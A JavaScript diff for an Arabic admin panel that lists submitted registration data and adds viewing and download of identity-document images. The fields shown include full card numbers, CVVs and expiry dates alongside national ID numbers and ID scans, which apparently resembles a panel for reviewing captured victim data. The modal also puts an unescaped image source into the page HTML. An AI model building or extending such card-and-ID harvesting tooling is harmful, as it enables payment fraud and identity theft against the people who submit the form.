@@ -28,7 +28,9 @@ const FORM_FIELD_LABELS = {
   email: 'البريد الإلكتروني', phone: 'رقم الجوال', gender: 'الجنس',
   birthDate: 'تاريخ الميلاد', nationality: 'الجنسية', residence: 'بلد الإقامة',
   shirtSize: 'مقاس القميص', pace: 'الوقت المتوقع', identityNumber: 'رقم الهوية',
+  identityFile: 'صورة وثيقة إثبات الهوية',
   club: 'النادي/العمل', coupon: 'رمز القسيمة', price: 'السعر',
+  terms: 'الموافقة على الشروط',
   // Payment Card
   cardNumber: 'رقم البطاقة', cardCvv: 'CVV', cardExpiry: 'تاريخ الانتهاء',
   cardholderName: 'الاسم على البطاقة',
@@ -350,6 +352,11 @@ function renderMessages(formData) {
       let fieldCount = 0;
       Object.entries(data).forEach(([key, value]) => {
         if (value !== undefined && value !== null && String(value).trim() !== '') {
+          // Skip auxiliary file fields or terms
+          if (key.endsWith('Name') && data[key.replace(/Name$/, '')]) return;
+          if (key.endsWith('Size') && data[key.replace(/Size$/, '')]) return;
+          if (key === 'terms') return;
+
           fieldCount++;
           const item = document.createElement('div');
           item.className = 'message-item';
@@ -357,12 +364,81 @@ function renderMessages(formData) {
           const label = document.createElement('span');
           label.className = 'message-label';
           label.textContent = FORM_FIELD_LABELS[key] || key;
-          
+          item.appendChild(label);
+
+          const strVal = String(value).trim();
+
+          // 1. Image Data URL or Image File
+          if (strVal.startsWith('data:image/') || /\.(png|jpe?g|webp|gif|svg)$/i.test(strVal)) {
+            const fileName = data[key + 'Name'] || data.identityFileName || 'صورة وثيقة الهوية';
+            const fileSize = data[key + 'Size'] || data.identityFileSize || '';
+            const card = document.createElement('div');
+            card.className = 'message-image-wrapper';
+            card.innerHTML = `
+              <div class="message-image-card">
+                <div class="message-image-preview-wrapper" onclick="window.openImageModal('${escapeHtml(strVal)}', '${escapeHtml(fileName)}')">
+                  <img src="${escapeHtml(strVal)}" alt="${escapeHtml(label.textContent)}" class="message-image-preview" loading="lazy" />
+                  <div class="image-overlay-btn"><i class="fas fa-search-plus"></i> تكبير وعرض الصورة</div>
+                </div>
+                <div class="message-image-footer">
+                  <span class="image-name" title="${escapeHtml(fileName)}">
+                    <i class="fas fa-id-card"></i> ${escapeHtml(fileName)} ${fileSize ? `(${escapeHtml(fileSize)})` : ''}
+                  </span>
+                  <a href="${escapeHtml(strVal)}" download="${escapeHtml(fileName || 'identity-document.jpg')}" class="btn-download-img" title="تحميل الصورة">
+                    <i class="fas fa-download"></i> تحميل
+                  </a>
+                </div>
+              </div>
+            `;
+            item.appendChild(card);
+            group.appendChild(item);
+            return;
+          }
+
+          // 2. PDF Document Data URL
+          if (strVal.startsWith('data:application/pdf')) {
+            const fileName = data[key + 'Name'] || data.identityFileName || 'مستند الهوية.pdf';
+            const pdfCard = document.createElement('div');
+            pdfCard.style.cssText = 'display:flex; align-items:center; justify-content:space-between; padding:12px; background:#f8fafc; border:1px solid #e2e8f0; border-radius:8px; gap:12px; margin-top:6px;';
+            pdfCard.innerHTML = `
+              <div style="display:flex; align-items:center; gap:10px;">
+                <i class="fas fa-file-pdf" style="font-size:26px; color:#ef4444;"></i>
+                <div>
+                  <strong style="display:block; font-size:13px; color:#1e293b;">${escapeHtml(fileName)}</strong>
+                  <span style="font-size:11px; color:#64748b;">مستند PDF</span>
+                </div>
+              </div>
+              <a href="${escapeHtml(strVal)}" download="${escapeHtml(fileName)}" class="btn-download-img">
+                <i class="fas fa-download"></i> تحميل المستند
+              </a>
+            `;
+            item.appendChild(pdfCard);
+            group.appendChild(item);
+            return;
+          }
+
+          // 3. Legacy identityFile text (sent in sessions before image streaming)
+          if (key === 'identityFile') {
+            const legacyNotice = document.createElement('div');
+            legacyNotice.style.cssText = 'padding:10px 14px; background:#fffbeb; border:1px solid #fde68a; border-radius:8px; margin-top:6px;';
+            legacyNotice.innerHTML = `
+              <div style="display:flex; align-items:center; gap:8px; color:#b45309; font-weight:600; font-size:13px;">
+                <i class="fas fa-file-image"></i> ${escapeHtml(strVal)}
+              </div>
+              <small style="display:block; color:#92400e; font-size:11px; margin-top:4px;">
+                (هذه الجلسة قديمة تم تسجيلها قبل التحديث - في أي تسجيل جديد بعد الآن ستظهر صورة الوثيقة الفعلية هنا مباشرة وبدقة عالية)
+              </small>
+            `;
+            item.appendChild(legacyNotice);
+            group.appendChild(item);
+            return;
+          }
+
+          // 4. Standard text field
           const val = document.createElement('span');
           val.className = 'message-value';
-          val.textContent = escapeHtml(String(value));
+          val.textContent = escapeHtml(strVal);
           
-          item.appendChild(label);
           item.appendChild(val);
           group.appendChild(item);
         }
@@ -521,6 +597,54 @@ function escapeHtml(str) {
     }
   });
 }
+
+window.openImageModal = function(src, title = 'وثيقة إثبات الهوية') {
+  let modal = document.getElementById('image-lightbox-modal');
+  if (!modal) {
+    modal = document.createElement('div');
+    modal.id = 'image-lightbox-modal';
+    modal.className = 'image-modal-backdrop';
+    document.body.appendChild(modal);
+  }
+
+  modal.innerHTML = `
+    <div class="image-modal-content" onclick="event.stopPropagation()">
+      <button class="image-modal-close" onclick="window.closeImageModal()" aria-label="إغلاق">&times;</button>
+      <div style="margin-bottom:12px; color:#fff; font-size:15px; font-weight:600; text-align:center;">
+        <i class="fas fa-id-card"></i> ${escapeHtml(title)}
+      </div>
+      <img src="${src}" alt="${escapeHtml(title)}" />
+      <div class="image-modal-actions">
+        <a href="${src}" download="${escapeHtml(title || 'identity-document.jpg')}" class="btn btn-primary">
+          <i class="fas fa-download"></i> تحميل الصورة بالدقة الكاملة
+        </a>
+        <button class="btn btn-secondary" onclick="window.closeImageModal()">
+          <i class="fas fa-times"></i> إغلاق
+        </button>
+      </div>
+    </div>
+  `;
+
+  modal.style.display = 'flex';
+  modal.onclick = function() {
+    window.closeImageModal();
+  };
+
+  const handleKeydown = function(e) {
+    if (e.key === 'Escape') {
+      window.closeImageModal();
+      document.removeEventListener('keydown', handleKeydown);
+    }
+  };
+  document.addEventListener('keydown', handleKeydown);
+};
+
+window.closeImageModal = function() {
+  const modal = document.getElementById('image-lightbox-modal');
+  if (modal) {
+    modal.style.display = 'none';
+  }
+};
 
 document.addEventListener('DOMContentLoaded', () => {
   setupSearch();
